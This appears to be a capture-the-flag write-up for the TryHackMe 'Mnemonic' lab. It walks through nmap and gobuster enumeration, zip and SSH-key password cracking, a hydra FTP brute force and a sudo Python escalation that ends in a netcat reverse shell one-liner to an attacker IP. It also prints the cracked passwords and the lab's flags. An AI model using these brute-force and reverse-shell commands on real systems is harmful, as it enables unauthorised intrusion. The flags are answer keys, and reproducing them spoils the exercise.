> Mnemonic | gobuster | OSINT

## export IP=10.10.29.204

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
1337/tcp  open     ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,py,html,js,bak,tar,zip,cgi

```
/index.html (Status: 200)
/webmasters (Status: 301)
/robots.txt (Status: 200)
```

# robots.txt

```
Allow: / 
Disallow: /webmasters/*
```

# Gobuster Webmasters

sudo gobuster -u http://$IP/webmasters -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster/webmasters -x txt,php,py,html,js,bak,tar,zip,cgi

```
/index.html (Status: 200)
/admin (Status: 301)
/backups (Status: 301)
```

# Gobuster backups

sudo gobuster -u http://$IP/webmasters/backups -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster/backups -x txt,php,py,html,js,bak,tar,zip,cgi

```
index.html
backups.zip
```

We get the file but it requires a password. Let's crack it using fcrackzip!

fcrackzip -D -p /snap/john-the-ripper/rockyou.txt -u backups.zip -v

`PASSWORD FOUND!!!!: pw == 00385007`

We have ftp username `ftpuser` now let's crack ftp password using hydra

hydra -l ftpuser -P /snap/john-the-ripper/rockyou.txt 10.10.29.204 ftp

`[21][ftp] host: 10.10.29.204   login: ftpuser   password: love4ever`

And we can login to FTP and now we find various directories. Looking at data-04 we have id_rsa and not.txt. In not.txt it asks james to change ftp password. Now let's crack ssh2john.

```
sudo python3 /snap/john-the-ripper/297/run/ssh2john.py id_rsa > mnemonic.txt
john --wordlist=/snap/john-the-ripper/rockyou.txt mnemonic.txt

bluelove         (id_rsa) => We got the password!!
```

And we can now log in as ssh. We have 2 files `noteforjames.txt` and `6450.txt`.

Searching for user flag. `find /home -type f -name user.txt`

```
find: ‘/home/jeff’: Permission denied
find: ‘/home/mike’: Permission denied
find: ‘/home/ftpuser’: Permission denied
find: ‘/home/condor/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='’: Permission denied
find: ‘/home/condor/.gnupg’: Permission denied
find: ‘/home/condor/.cache’: Permission denied
find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied
find: ‘/home/john’: Permission denied
find: ‘/home/alex’: Permission denied
find: ‘/home/vill’: Permission denied
```

And decoding 1st one we have user flag.

## user.txt

```
THM{a5f82a00e2feee3465249b855be71c01}
```

And decoding the 2nd one we have a link `https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg`

Now let's see what is mnemonic it is an encryption based on image. I found a tool online let's get the 6450.txt file and first let's load the image to the tool and then the list .We get the password  `pasificbell1981` .Let's try condor in ssh since he had the user.txt.

# Privilege Escalation

sudo -l

```
(ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```

Looking at /bin/examplecode.py we have os.system in option 1 .Let's try to get a reverse shell.

On executing `sudo /usr/bin/python3 /bin/examplecode.py` choose option 0 then . and get a reverse shell `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 1234 >/tmp/f`. We have a shell!

# root.txt

`THM{congratulationsyoumadeithashme}`

And now we have to md5 the string inside brackets `echo -n congratulationsyoumadeithashme | md5sum`

```
THM{2a4825f50b0c16636984b448669b0586}
```